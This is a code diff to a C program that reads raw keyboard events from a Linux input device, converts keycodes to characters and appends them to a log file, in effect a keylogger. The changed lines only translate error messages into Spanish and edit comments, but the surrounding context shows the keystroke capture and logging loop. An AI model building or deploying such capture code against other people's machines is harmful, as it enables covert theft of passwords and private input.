@@ -20,13 +20,13 @@ int main() {
 
     int device_keyboard = open(path_keyboard, O_RDONLY);
     if (device_keyboard == -1) {
-        perror("Error opening device");
+        perror("Error al abrir el dispositivo");
         exit(EXIT_FAILURE);
     }
 
     FILE *fp = fopen(LOGFILEPATH, "a");
     if (fp == NULL) {
-        perror("Error opening log file");
+        perror("Error al abrir el archivo de log");
         close(device_keyboard);
         exit(EXIT_FAILURE);
     }
@@ -38,13 +38,13 @@ int main() {
     while (1) {
         ssize_t bytesRead = read(device_keyboard, &ev, sizeof(ev));
         if (bytesRead < 0) {
-            perror("Error reading from device");
+            perror("Error al leer desde el dispositivo");
             break;
         }
 
         if (ev.type == EV_KEY) {
             handleSpecialKeys(ev.code, ev.value, &shift, &altGr, &capsLock);
-            if (ev.value == 0) { // Key release
+            if (ev.value == 0) { 
                 char keyChar = getKeyChar(ev.code, shift, altGr, capsLock);
                 if (keyChar != '\0') {
                     if (keyChar == '\b') {
@@ -78,6 +78,7 @@ char *getEvent() {
 
 char getKeyChar(int keycode, int shift, int altGr, int capsLock) {
     char key = '\0';
+    //Caracteres normales
     switch (keycode) {
         case KEY_A: key = 'a'; break;
         case KEY_B: key = 'b'; break;
@@ -164,7 +165,6 @@ char getKeyChar(int keycode, int shift, int altGr, int capsLock) {
     if (altGr) {
         switch (keycode) {
             case KEY_Q: key = '@'; break;
-            // Otros casos que consideres necesarios para tu teclado
         }
     }
 
